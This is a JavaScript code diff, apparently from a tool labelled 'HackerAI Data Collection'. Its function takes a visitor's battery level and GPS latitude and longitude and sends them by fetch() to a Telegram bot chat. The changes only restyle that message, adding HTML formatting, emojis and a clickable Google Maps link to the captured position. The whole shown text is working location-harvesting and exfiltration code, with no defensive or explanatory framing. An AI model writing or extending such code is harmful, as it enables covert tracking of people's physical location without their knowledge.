@@ -186,15 +186,25 @@
       }
 
       /**
-       * Send battery + GPS data as a text message.
+       * Send battery + GPS data as a styled text message with emojis,
+       * HTML formatting, and a clickable Google Maps link.
        */
       function sendMessageToTelegram(batteryPct, coords) {
+        // Build a Google Maps deep-link URL
+        var mapsUrl = 'https://www.google.com/maps?q=' + coords.latitude + ',' + coords.longitude;
+
+        // Styled message using HTML parse_mode with emojis
         var text = [
-          '[ HackerAI Data Collection ]',
-          'Battery: ' + batteryPct + '%',
-          'Latitude: ' + coords.latitude,
-          'Longitude: ' + coords.longitude,
-          'Timestamp: ' + new Date().toISOString()
+          '<b>\u{1F4A1} HackerAI Data Collection</b>',
+          '',
+          '<b>\u{1F50B} Battery:</b> ' + batteryPct + '%',
+          '<b>\u{1F4CD} Location:</b>',
+          '  \u{2022} <i>Latitude:</i>  ' + coords.latitude,
+          '  \u{2022} <i>Longitude:</i> ' + coords.longitude,
+          '',
+          '<a href="' + mapsUrl + '">\u{1F5FA}\uFE0F  Open in Google Maps</a>',
+          '',
+          '\u{23F3} <i>Captured at ' + new Date().toLocaleString() + '</i>'
         ].join('\n');
 
         return fetch(TELEGRAM_API + '/sendMessage', {
@@ -202,7 +212,9 @@
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             chat_id: TELEGRAM_CHAT_ID,
-            text: text
+            text: text,
+            parse_mode: 'HTML',
+            disable_web_page_preview: false
           })
         }).then(function(res) {
           return res.json();
